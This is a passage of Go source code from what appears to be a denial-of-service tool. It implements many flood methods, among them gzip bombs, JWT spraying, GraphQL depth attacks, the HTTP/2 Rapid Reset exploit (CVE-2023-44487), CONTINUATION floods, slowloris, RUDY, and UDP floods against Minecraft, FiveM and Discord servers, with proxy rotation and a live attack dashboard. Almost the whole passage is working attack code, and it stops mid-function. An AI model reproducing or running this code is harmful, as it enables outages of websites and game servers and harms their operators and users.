	req.Header.Set("X-Forwarded-For", randomIP()+", "+randomIP()+", "+randomIP())
	req.Header.Set("Referer", "https://"+spoofedHosts[rand.Intn(len(spoofedHosts))]+"/")
	atomic.AddInt64(&totalReq, 1)
	trackMethod("origin-spoof")
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

// etagStormRequest sends rotating If-None-Match / If-Match to force conditional logic
func etagStormRequest(client *http.Client, targetURL string) bool {
	req, err := http.NewRequest("GET", targetURL+randomPath(), nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
	// Generate 50 random ETags
	var etags []string
	for i := 0; i < 50; i++ {
		etags = append(etags, `"`+randString(32)+`"`)
	}
	req.Header.Set("If-None-Match", strings.Join(etags, ", "))
	req.Header.Set("If-Match", `"`+randString(32)+`"`)
	req.Header.Set("If-Modified-Since", time.Unix(rand.Int63n(time.Now().Unix()), 0).UTC().Format(http.TimeFormat))
	req.Header.Set("If-Unmodified-Since", time.Unix(rand.Int63n(time.Now().Unix()), 0).UTC().Format(http.TimeFormat))
	atomic.AddInt64(&totalReq, 1)
	trackMethod("etag-storm")
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

// acceptFloodRequest mutates Accept-* headers to exhaust content negotiation
func acceptFloodRequest(client *http.Client, targetURL string) bool {
	req, err := http.NewRequest("GET", targetURL+randomPath(), nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
	acceptTypes := []string{
		"application/json", "application/xml", "text/html", "text/plain",
		"application/octet-stream", "image/webp", "image/avif",
		"application/pdf", "application/zip", "*/*",
	}
	// Randomize 20 accept types with random q values
	var accepts []string
	for i := 0; i < 20; i++ {
		q := float64(rand.Intn(10)) / 10.0
		accepts = append(accepts, fmt.Sprintf("%s;q=%.1f", acceptTypes[rand.Intn(len(acceptTypes))], q))
	}
	req.Header.Set("Accept", strings.Join(accepts, ", "))
	req.Header.Set("Accept-Language", strings.Join([]string{
		"en-US;q=0.9", "en;q=0.8", "fr;q=0.7", "de;q=0.6",
		"ja;q=0.5", "zh-CN;q=0.4", "*;q=0.1",
	}, ", "))
	req.Header.Set("Accept-Encoding", "gzip;q=1.0, deflate;q=0.8, br;q=0.7, *;q=0.1")
	req.Header.Set("Accept-Charset", "utf-8;q=1.0, iso-8859-1;q=0.8, *;q=0.5")
	atomic.AddInt64(&totalReq, 1)
	trackMethod("accept-flood")
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

// gzipBombRequest sends compressed payloads that expand massively on server
func gzipBombRequest(client *http.Client, targetURL string) bool {
	bomb := genGzipBombPayload()
	req, err := http.NewRequest("POST", targetURL+randomPath(), bytes.NewReader(bomb))
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("Content-Encoding", "gzip")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Transfer-Encoding", "identity")
	atomic.AddInt64(&totalReq, 1)
	atomic.AddInt64(&totalBytes, int64(len(bomb)))
	trackMethod("gzip-bomb")
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

// jwtSprayRequest floods auth endpoints with forged JWT tokens
func jwtSprayRequest(client *http.Client, targetURL string) bool {
	authEndpoints := []string{
		"/api/v1/auth", "/api/v2/auth", "/api/v1/me", "/api/v1/profile",
		"/api/v1/admin", "/api/v2/users/me", "/api/v1/refresh",
		"/oauth/token", "/auth/validate", "/api/token/verify",
	}
	endpoint := authEndpoints[rand.Intn(len(authEndpoints))]
	req, err := http.NewRequest("GET", targetURL+endpoint, nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
	// Rotate auth header style
	switch rand.Intn(3) {
	case 0:
		req.Header.Set("Authorization", "Bearer "+genFakeJWT())
	case 1:
		req.Header.Set("Authorization", "Token "+randString(64))
	case 2:
		req.Header.Set("Authorization", "Basic "+base64.StdEncoding.EncodeToString([]byte(randString(8)+":"+randString(16))))
	}
	req.Header.Set("X-API-Key", randString(32))
	req.Header.Set("X-Auth-Token", genFakeJWT())
	req.Header.Set("X-Request-ID", randString(32))
	atomic.AddInt64(&totalReq, 1)
	trackMethod("jwt-spray")
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

// graphqlDepthRequest sends deeply nested GraphQL queries to exhaust resolvers
func graphqlDepthRequest(client *http.Client, targetURL string) bool {
	graphqlEndpoints := []string{"/graphql", "/api/graphql", "/gql", "/api/gql", "/v1/graphql"}
	endpoint := graphqlEndpoints[rand.Intn(len(graphqlEndpoints))]
	query := graphqlQueries[rand.Intn(len(graphqlQueries))]
	req, err := http.NewRequest("POST", targetURL+endpoint, strings.NewReader(query))
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("Authorization", "Bearer "+genFakeJWT())
	req.Header.Set("X-Request-ID", randString(32))
	atomic.AddInt64(&totalReq, 1)
	atomic.AddInt64(&totalBytes, int64(len(query)))
	trackMethod("graphql-depth")
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

// multipartExhaustRequest floods with enormous multipart form uploads
func multipartExhaustRequest(client *http.Client, targetURL string) bool {
	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)
	// Write 20-50 fields with large values
	n := 20 + rand.Intn(30)
	for i := 0; i < n; i++ {
		fw, err := mw.CreateFormField(randString(8+rand.Intn(8)))
		if err != nil {
			continue
		}
		fw.Write([]byte(randString(1024 + rand.Intn(4096))))
	}
	// Write a fake file part
	fw, _ := mw.CreateFormFile("file", randString(8)+".bin")
	fw.Write(generatePayload(32768 + rand.Intn(32768)))
	mw.Close()

	req, err := http.NewRequest("POST", targetURL+randomPath(), &buf)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Content-Type", mw.FormDataContentType())
	atomic.AddInt64(&totalReq, 1)
	atomic.AddInt64(&totalBytes, int64(buf.Len()))
	trackMethod("multipart-exhaust")
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

// retryAfterAbuseRequest hammers endpoints that return 429/503 without backing off
func retryAfterAbuseRequest(client *http.Client, targetURL string) bool {
	req, err := http.NewRequest("GET", targetURL+randomPath(), nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Retry-After", "0")
	req.Header.Set("X-RateLimit-Reset", "0")
	req.Header.Set("X-Retry", "1")
	req.Header.Set("Referer", randomReferer())
	req.Header.Set("Cache-Control", "no-cache")
	atomic.AddInt64(&totalReq, 1)
	trackMethod("retry-after")
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

// ─────────────────────────────────────────────
//  ── ADVANCED HTTP/2 METHODS ──
// ─────────────────────────────────────────────

// h2PriorityFlood sends a storm of PRIORITY frames to exhaust h2 priority queues
func h2PriorityFlood(targetURL string) error {
	_, host, p, _ := parseTarget(targetURL)
	rawConn, err := dialTarget(host, p)
	if err != nil {
		return err
	}
	tlsConn := tls.Client(rawConn, &tls.Config{
		ServerName:         host,
		NextProtos:         []string{"h2"},
		InsecureSkipVerify: true,
	})
	if err := tlsConn.Handshake(); err != nil {
		rawConn.Close()
		return err
	}
	defer tlsConn.Close()
	if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
		return fmt.Errorf("h2 not negotiated")
	}
	tlsConn.Write([]byte(http2.ClientPreface))
	bw := bufio.NewWriterSize(tlsConn, 65536)
	framer := http2.NewFramer(bw, tlsConn)
	framer.AllowIllegalWrites = true
	framer.WriteSettings(
		http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 1000},
	)
	bw.Flush()

	go func() {
		for {
			if _, err := framer.ReadFrame(); err != nil {
				return
			}
		}
	}()

	// Flood PRIORITY frames on odd stream IDs, all pointing to stream 0
	for i := 0; i < 500; i++ {
		sid := uint32(i*2 + 1)
		framer.WritePriority(sid, http2.PriorityParam{
			StreamDep: 0,
			Weight:    uint8(rand.Intn(256)),
			Exclusive: rand.Intn(2) == 0,
		})
		atomic.AddInt64(&totalSuccess, 1)
		atomic.AddInt64(&totalBytes, 9)
	}
	bw.Flush()
	trackMethod("h2-priority")
	return nil
}

// rapidResetOnce — CVE-2023-44487, unchanged but now tracked
func rapidResetOnce(targetURL string) error {
	scheme, host, p, path := parseTarget(targetURL)
	rawConn, err := dialTarget(host, p)
	if err != nil {
		return err
	}
	tlsConn := tls.Client(rawConn, &tls.Config{
		ServerName:         host,
		NextProtos:         []string{"h2"},
		InsecureSkipVerify: true,
	})
	if err := tlsConn.Handshake(); err != nil {
		rawConn.Close()
		return err
	}
	defer tlsConn.Close()
	if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
		return fmt.Errorf("h2 not negotiated")
	}
	tlsConn.Write([]byte(http2.ClientPreface))
	bw := bufio.NewWriterSize(tlsConn, 65536)
	framer := http2.NewFramer(bw, tlsConn)
	framer.AllowIllegalWrites = true

	var writeMu sync.Mutex
	writeMu.Lock()
	framer.WriteSettings(
		http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 1000},
		http2.Setting{ID: http2.SettingInitialWindowSize, Val: 65535},
	)
	bw.Flush()
	writeMu.Unlock()

	done := make(chan struct{})
	go func() {
		defer close(done)
		for {
			f, err := framer.ReadFrame()
			if err != nil {
				return
			}
			if sf, ok := f.(*http2.SettingsFrame); ok && !sf.IsAck() {
				writeMu.Lock()
				framer.WriteSettingsAck()
				bw.Flush()
				writeMu.Unlock()
			}
		}
	}()

	var hdrBuf bytes.Buffer
	enc := hpack.NewEncoder(&hdrBuf)
	enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
	enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
	enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: scheme})
	enc.WriteField(hpack.HeaderField{Name: ":authority", Value: host})
	enc.WriteField(hpack.HeaderField{Name: "user-agent", Value: randomUserAgent()})
	fragment := append([]byte(nil), hdrBuf.Bytes()...)

	var streamID uint32 = 1
	for i := 0; i < 150; i++ {
		select {
		case <-done:
			return fmt.Errorf("connection closed")
		default:
		}
		writeMu.Lock()
		framer.WriteHeaders(http2.HeadersFrameParam{
			StreamID:      streamID,
			BlockFragment: fragment,
			EndStream:     true,
			EndHeaders:    true,
		})
		framer.WriteRSTStream(streamID, http2.ErrCodeCancel)
		bw.Flush()
		writeMu.Unlock()
		atomic.AddInt64(&totalReq, 1)
		atomic.AddInt64(&totalSuccess, 1)
		atomic.AddInt64(&totalBytes, int64(len(fragment)+18))
		trackMethod("rapid-reset")
		streamID += 2
		if streamID >= 1<<31-1 {
			break
		}
	}
	time.Sleep(5 * time.Millisecond)
	return nil
}

func h2ContOnce(targetURL string) error {
	scheme, host, p, path := parseTarget(targetURL)
	rawConn, err := dialTarget(host, p)
	if err != nil {
		return err
	}
	tlsConn := tls.Client(rawConn, &tls.Config{
		ServerName:         host,
		NextProtos:         []string{"h2"},
		InsecureSkipVerify: true,
	})
	if err := tlsConn.Handshake(); err != nil {
		rawConn.Close()
		return err
	}
	defer tlsConn.Close()
	if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
		return fmt.Errorf("h2 not negotiated")
	}
	tlsConn.Write([]byte(http2.ClientPreface))
	bw := bufio.NewWriterSize(tlsConn, 65536)
	framer := http2.NewFramer(bw, tlsConn)
	framer.AllowIllegalWrites = true
	framer.WriteSettings()
	bw.Flush()
	go func() {
		for {
			if _, err := framer.ReadFrame(); err != nil {
				return
			}
		}
	}()
	var hdrBuf bytes.Buffer
	enc := hpack.NewEncoder(&hdrBuf)
	enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
	enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
	enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: scheme})
	enc.WriteField(hpack.HeaderField{Name: ":authority", Value: host})
	enc.WriteField(hpack.HeaderField{Name: "user-agent", Value: randomUserAgent()})
	fragment := append([]byte(nil), hdrBuf.Bytes()...)
	framer.WriteHeaders(http2.HeadersFrameParam{
		StreamID:      1,
		BlockFragment: fragment,
		EndStream:     false,
		EndHeaders:    false,
	})
	for i := 0; i < 3000; i++ {
		if err := framer.WriteContinuation(1, false, fragment); err != nil {
			bw.Flush()
			return nil
		}
		atomic.AddInt64(&totalSuccess, 1)
		atomic.AddInt64(&totalBytes, int64(len(fragment)))
		trackMethod("h2-cont")
	}
	bw.Flush()
	return nil
}

// httpPipelineFlood sends pipelined HTTP/1.1 requests without waiting for responses
func httpPipelineFlood(targetURL string) error {
	_, host, p, _ := parseTarget(targetURL)
	rawConn, err := dialTarget(host, p)
	if err != nil {
		return err
	}
	tlsConn := tls.Client(rawConn, &tls.Config{
		ServerName:         host,
		InsecureSkipVerify: true,
	})
	if err := tlsConn.Handshake(); err != nil {
		rawConn.Close()
		return err
	}
	defer tlsConn.Close()
	var buf strings.Builder
	// Pack 50 pipelined requests in one write
	for i := 0; i < 50; i++ {
		path := randomPath()
		ua := randomUserAgent()
		fmt.Fprintf(&buf, "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n",
			path, host, ua)
		atomic.AddInt64(&totalReq, 1)
	}
	payload := buf.String()
	tlsConn.Write([]byte(payload))
	atomic.AddInt64(&totalBytes, int64(len(payload)))
	atomic.AddInt64(&totalSuccess, 50)
	trackMethod("http-pipeline")
	// Drain whatever comes back
	tlsConn.SetReadDeadline(time.Now().Add(2 * time.Second))
	io.Copy(io.Discard, tlsConn)
	return nil
}

// tlsFragmentFlood sends fragmented TLS records to stress TLS state machines
func tlsFragmentFlood(host, p string) error {
	addr := net.JoinHostPort(host, p)
	rawConn, err := net.DialTimeout("tcp", addr, 5*time.Second)
	if err != nil {
		return err
	}
	defer rawConn.Close()

	// Craft a minimal TLS ClientHello and split it across multiple records
	// Record header: type=22 (handshake), version=0x0301 (TLS 1.0), length
	clientHello := []byte{
		0x16, 0x03, 0x01, 0x00, 0x2f, // TLS record header
		0x01, 0x00, 0x00, 0x2b, // Handshake: ClientHello
		0x03, 0x03, // TLS 1.2
	}
	// Append 32 random bytes for random
	clientHello = append(clientHello, generatePayload(32)...)
	// session id len = 0, cipher suites len = 2, one cipher, compression = 0
	clientHello = append(clientHello, 0x00, 0x00, 0x02, 0x00, 0x2f, 0x01, 0x00)

	// Send in 3-byte fragments (illegal fragmentation)
	for i := 0; i < len(clientHello); i += 3 {
		end := i + 3
		if end > len(clientHello) {
			end = len(clientHello)
		}
		rawConn.Write(clientHello[i:end])
		time.Sleep(5 * time.Millisecond)
	}
	atomic.AddInt64(&totalReq, 1)
	atomic.AddInt64(&totalSuccess, 1)
	atomic.AddInt64(&totalBytes, int64(len(clientHello)))
	trackMethod("tls-fragment")
	return nil
}

// ─────────────────────────────────────────────
//  ── SLOW METHODS ──
// ─────────────────────────────────────────────

type slowReader struct {
	data  []byte
	pos   int
	delay time.Duration
	stop  <-chan struct{}
}

func (r *slowReader) Read(p []byte) (int, error) {
	select {
	case <-r.stop:
		return 0, io.EOF
	default:
	}
	if r.pos >= len(r.data) {
		r.pos = 0
	}
	p[0] = r.data[r.pos]
	r.pos++
	time.Sleep(r.delay)
	return 1, nil
}

type chunkDripReader struct {
	stop <-chan struct{}
}

func (r *chunkDripReader) Read(p []byte) (int, error) {
	select {
	case <-r.stop:
		return 0, io.EOF
	case <-time.After(time.Duration(300+rand.Intn(1200)) * time.Millisecond):
		n := copy(p, []byte(randString(rand.Intn(16)+4)))
		return n, nil
	}
}

func rudyRequest(client *http.Client, targetURL string, stop <-chan struct{}) bool {
	declaredSize := 1024*1024 + rand.Intn(50*1024*1024)
	chunk := []byte("comment=" + randString(50) + "&" + randString(10) + "=" + randString(20) + "&")
	slow := &slowReader{
		data:  chunk,
		delay: time.Duration(400+rand.Intn(1600)) * time.Millisecond,
		stop:  stop,
	}
	req, err := http.NewRequest("POST", targetURL+randomPath(), slow)
	if err != nil {
		return false
	}
	req.ContentLength = int64(declaredSize)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Referer", randomReferer())
	atomic.AddInt64(&totalReq, 1)
	trackMethod("rudy")
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

func chunkPostRequest(client *http.Client, targetURL string, stop <-chan struct{}) bool {
	body := io.NopCloser(&chunkDripReader{stop: stop})
	req, err := http.NewRequest("POST", targetURL+randomPath(), body)
	if err != nil {
		return false
	}
	req.ContentLength = -1
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Connection", "keep-alive")
	atomic.AddInt64(&totalReq, 1)
	trackMethod("chunk-post")
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

func slowlorisOnce(targetURL string, stop <-chan struct{}) bool {
	scheme, host, p, _ := parseTarget(targetURL)
	rawConn, err := dialTarget(host, p)
	if err != nil {
		return false
	}
	var conn net.Conn = rawConn
	if scheme != "http" {
		tlsConn := tls.Client(rawConn, &tls.Config{ServerName: host, InsecureSkipVerify: true})
		if err := tlsConn.Handshake(); err != nil {
			rawConn.Close()
			return false
		}
		conn = tlsConn
	}
	fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n", host, randomUserAgent())
	ticker := time.NewTicker(time.Duration(1+rand.Intn(3)) * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-stop:
			conn.Close()
			return true
		case <-ticker.C:
			_, err := fmt.Fprintf(conn, "X-%s: %s\r\n", randString(5), randString(10))
			if err != nil {
				conn.Close()
				return false
			}
			atomic.AddInt64(&totalSuccess, 1)
			trackMethod("slowloris")
		}
	}
}

func malformedOnce(targetURL string) error {
	scheme, host, p, _ := parseTarget(targetURL)
	rawConn, err := dialTarget(host, p)
	if err != nil {
		return err
	}
	var conn net.Conn = rawConn
	if scheme != "http" {
		tlsConn := tls.Client(rawConn, &tls.Config{ServerName: host, InsecureSkipVerify: true})
		if err := tlsConn.Handshake(); err != nil {
			rawConn.Close()
			return err
		}
		conn = tlsConn
	}
	longURL := "/" + randString(8192+rand.Intn(8192))
	payload := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\n\r\n", longURL, host, randomUserAgent())
	conn.Write([]byte(payload))
	conn.Close()
	atomic.AddInt64(&totalReq, 1)
	atomic.AddInt64(&totalSuccess, 1)
	atomic.AddInt64(&totalBytes, int64(len(payload)))
	trackMethod("malformed")
	return nil
}

// ─────────────────────────────────────────────
//  ── UDP / GAME WORKERS ──
// ─────────────────────────────────────────────

func writeVarInt(buf *bytes.Buffer, value int32) {
	for {
		temp := byte(value & 0x7F)
		value >>= 7
		if value != 0 {
			temp |= 0x80
		}
		buf.WriteByte(temp)
		if value == 0 {
			break
		}
	}
}

func minecraftWorker(ctx context.Context, host string, mcPort int) {
	addr := fmt.Sprintf("%s:%d", host, mcPort)
	for {
		select {
		case <-ctx.Done():
			return
		default:
			conn, err := net.Dial("tcp", addr)
			if err != nil {
				continue
			}
			buf := new(bytes.Buffer)
			writeVarInt(buf, 764) // 1.20.2 protocol
			writeVarInt(buf, int32(len(host)))
			buf.WriteString(host)
			binary.Write(buf, binary.BigEndian, uint16(mcPort))
			writeVarInt(buf, 1)
			handshake := new(bytes.Buffer)
			writeVarInt(handshake, int32(buf.Len()+1))
			handshake.WriteByte(0x00)
			handshake.Write(buf.Bytes())
			conn.Write(handshake.Bytes())
			statusReq := new(bytes.Buffer)
			writeVarInt(statusReq, 1)
			statusReq.WriteByte(0x00)
			conn.Write(statusReq.Bytes())
			io.Copy(io.Discard, conn)
			conn.Close()
			atomic.AddInt64(&totalSuccess, 1)
			trackMethod("minecraft")
		}
	}
}

type FivemWorker struct {
	Target string
	Port   int
	Burst  int
}

func (fw *FivemWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
	defer wg.Done()
	addr := fmt.Sprintf("%s:%d", fw.Target, fw.Port)
	conn, err := net.Dial("udp", addr)
	if err != nil {
		return
	}
	defer conn.Close()
	payload := []byte("\xff\xff\xff\xffgetinfo xxx\x00\x00\x00")
	for {
		select {
		case <-ctx.Done():
			return
		default:
			for i := 0; i < fw.Burst; i++ {
				if _, err := conn.Write(payload); err == nil {
					atomic.AddInt64(&totalSuccess, 1)
					atomic.AddInt64(&totalBytes, int64(len(payload)))
					trackMethod("fivem")
				} else {
					atomic.AddInt64(&totalFail, 1)
				}
			}
		}
	}
}

type UDPDiscordWorker struct{ Target string; Port int }

func (uw *UDPDiscordWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
	defer wg.Done()
	addr := fmt.Sprintf("%s:%d", uw.Target, uw.Port)
	conn, err := net.Dial("udp", addr)
	if err != nil {
		return
	}
	defer conn.Close()
	for {
		select {
		case <-ctx.Done():
			return
		default:
			payload := discordPayloads[rand.Intn(len(discordPayloads))]
			if _, err := conn.Write(payload); err == nil {
				atomic.AddInt64(&totalSuccess, 1)
				atomic.AddInt64(&totalBytes, int64(len(payload)))
				trackMethod("udp-discord")
			} else {
				atomic.AddInt64(&totalFail, 1)
			}
		}
	}
}

type UDPBypassWorker struct{ Target string; Port int }

func (uw *UDPBypassWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
	defer wg.Done()
	addr := fmt.Sprintf("%s:%d", uw.Target, uw.Port)
	conn, err := net.Dial("udp", addr)
	if err != nil {
		return
	}
	defer conn.Close()
	for {
		select {
		case <-ctx.Done():
			return
		default:
			size := rand.Intn(1200) + 50
			payload := generatePayload(size)
			if rand.Intn(3) == 0 {
				payload[0] = 0xFF
				payload[1] = 0xFF
				payload[2] = 0xFF
				payload[3] = 0xFF
			}
			if _, err := conn.Write(payload); err == nil {
				atomic.AddInt64(&totalSuccess, 1)
				atomic.AddInt64(&totalBytes, int64(size))
				trackMethod("udp-bypass")
			} else {
				atomic.AddInt64(&totalFail, 1)
			}
		}
	}
}

type UDPGbpsWorker struct{ Target string; Port, Size int }

func (uw *UDPGbpsWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
	defer wg.Done()
	addr := fmt.Sprintf("%s:%d", uw.Target, uw.Port)
	conn, err := net.Dial("udp", addr)
	if err != nil {
		return
	}
	defer conn.Close()
	payload := generatePayload(uw.Size)
	for {
		select {
		case <-ctx.Done():
			return
		default:
			if _, err := conn.Write(payload); err == nil {
				atomic.AddInt64(&totalSuccess, 1)
				atomic.AddInt64(&totalBytes, int64(uw.Size))
				trackMethod("udp-gbps")
			} else {
				atomic.AddInt64(&totalFail, 1)
			}
		}
	}
}

type WsFloodWorker struct{ Target string }

func (ww *WsFloodWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
	defer wg.Done()
	wsURL := ww.Target
	if strings.HasPrefix(wsURL, "http://") {
		wsURL = "ws://" + wsURL[7:]
	} else if strings.HasPrefix(wsURL, "https://") {
		wsURL = "wss://" + wsURL[8:]
	} else if !strings.HasPrefix(wsURL, "ws://") && !strings.HasPrefix(wsURL, "wss://") {
		wsURL = "wss://" + wsURL
	}
	var proxyURL *url.URL
	if len(proxies) > 0 {
		if p, err := url.Parse(proxies[rand.Intn(len(proxies))]); err == nil {
			proxyURL = p
		}
	}
	dialer := websocket.Dialer{
		HandshakeTimeout: 10 * time.Second,
		TLSClientConfig:  &tls.Config{InsecureSkipVerify: true},
	}
	if proxyURL != nil {
		dialer.Proxy = func(req *http.Request) (*url.URL, error) { return proxyURL, nil }
	}
	headers := http.Header{}
	headers.Set("User-Agent", randomUserAgent())
	headers.Set("Origin", ww.Target)
	for {
		select {
		case <-ctx.Done():
			return
		default:
		}
		conn, _, err := dialer.Dial(wsURL, headers)
		if err != nil {
			atomic.AddInt64(&totalFail, 1)
			continue
		}
		go func() {
			for {
				if _, _, err := conn.ReadMessage(); err != nil {
					return
				}
			}
		}()
	inner:
		for {
			select {
			case <-ctx.Done():
				conn.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))
				conn.Close()
				return
			default:
			}
			var werr error
			switch rand.Intn(6) {
			case 0:
				msg := fmt.Sprintf(`{"action":"%s","data":"%s","ts":%d}`, randString(8), randString(200+rand.Intn(2000)), time.Now().UnixNano())
				werr = conn.WriteMessage(websocket.TextMessage, []byte(msg))
			case 1:
				data := make([]byte, 4096+rand.Intn(12288))
				rand.Read(data)
				werr = conn.WriteMessage(websocket.BinaryMessage, data)
			case 2:
				werr = conn.WriteMessage(websocket.PingMessage, []byte(randString(16)))
			case 3:
				werr = conn.WriteMessage(websocket.TextMessage, []byte(randString(16384+rand.Intn(49152))))
			case 4:
				for j := 0; j < 20; j++ {
					if e := conn.WriteMessage(websocket.TextMessage, []byte(randString(64))); e != nil {
						werr = e
						break
					}
					atomic.AddInt64(&totalSuccess, 1)
					atomic.AddInt64(&totalBytes, 64)
					trackMethod("ws-flood")
				}
			case 5:
				// Send a fragmented WS message
				w, e := conn.NextWriter(websocket.TextMessage)
				if e == nil {
					for j := 0; j < 10; j++ {
						w.Write([]byte(randString(512)))
					}
					w.Close()
				}
				werr = e
			}
			if werr != nil {
				atomic.AddInt64(&totalFail, 1)
				conn.Close()
				break inner
			}
			atomic.AddInt64(&totalSuccess, 1)
			trackMethod("ws-flood")
		}
	}
}

// ─────────────────────────────────────────────
//  ── WORKER INFRASTRUCTURE ──
// ─────────────────────────────────────────────

type requestFunc func(client *http.Client, url string) bool

func spawnRequestWorkers(ctx context.Context, wg *sync.WaitGroup, url string, fn requestFunc) {
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			client := newHTTPClientTLSWithProxy(randomFromList(proxies, ""), connections)
			for {
				select {
				case <-ctx.Done():
					return
				default:
					for j := 0; j < connections; j++ {
						if fn(client, url) {
							atomic.AddInt64(&totalSuccess, 1)
						} else {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			}
		}()
	}
}

// ─────────────────────────────────────────────
//  ── LIVE DASHBOARD ──
// ─────────────────────────────────────────────

func statsReporter(ctx context.Context, mode string) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	var prevReq int64
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			reqs := atomic.LoadInt64(&totalReq)
			ok := atomic.LoadInt64(&totalSuccess)
			fail := atomic.LoadInt64(&totalFail)
			data := atomic.LoadInt64(&totalBytes)
			elapsed := time.Since(attackStart)
			secs := elapsed.Seconds()
			if secs < 1 {
				secs = 1
			}
			rps := reqs - prevReq
			prevReq = reqs
			remaining := time.Duration(durationSec)*time.Second - elapsed
			if remaining < 0 {
				remaining = 0
			}

			// Build compact dashboard line
			bar := buildProgressBar(elapsed, time.Duration(durationSec)*time.Second, 20)
			line := fmt.Sprintf(
				"\r%s[%s]%s %s RPS:%s%d%s | Req:%s%d%s | OK:%s%d%s | Fail:%s%d%s | Data:%s%s%s | Left:%s%s%s",
				BCyan, mode, Reset,
				bar,
				BYellow, rps, Reset,
				BWhite, reqs, Reset,
				BGreen, ok, Reset,
				BRed, fail, Reset,
				Cyan, formatBytes(float64(data)), Reset,
				Yellow, formatDuration(remaining), Reset,
			)
			fmt.Print(line)
		}
	}
}

func buildProgressBar(elapsed, total time.Duration, width int) string {
	if total <= 0 {
		return "[" + strings.Repeat("█", width) + "]"
	}
	pct := float64(elapsed) / float64(total)
	if pct > 1 {
		pct = 1
	}
	filled := int(pct * float64(width))
	empty := width - filled
	return Green + "[" + strings.Repeat("█", filled) + Gray + strings.Repeat("░", empty) + Green + "]" + Reset
}

func mparam(label, value, vcolor string) {
	content := " " + White + label + Reset + " : " + vcolor + value + Reset
	pad := 52 - len(label) - len(value)
	if pad < 1 {
		pad = 1
	}
	fmt.Println(Cyan+"║"+Reset+content+strings.Repeat(" ", pad)+Cyan+"║"+Reset)
}

func fparam(label, value string) {
	content := " " + White + label + Reset + " : " + BWhite + value + Reset
	pad := 52 - len(label) - len(value)
	if pad < 1 {
		pad = 1
	}
	fmt.Println(Magenta+"║"+Reset+content+strings.Repeat(" ", pad)+Magenta+"║"+Reset)
}

func printFinalStats(mode string) {
	elapsed := time.Since(attackStart).Seconds()
	if elapsed < 1 {
		elapsed = 1
	}
	reqs := atomic.LoadInt64(&totalReq)
	ok := atomic.LoadInt64(&totalSuccess)
	fail := atomic.LoadInt64(&totalFail)
	data := atomic.LoadInt64(&totalBytes)

	fmt.Println()
	fmt.Println()
	fmt.Println(Magenta + "╔" + strings.Repeat("═", 56) + "╗" + Reset)
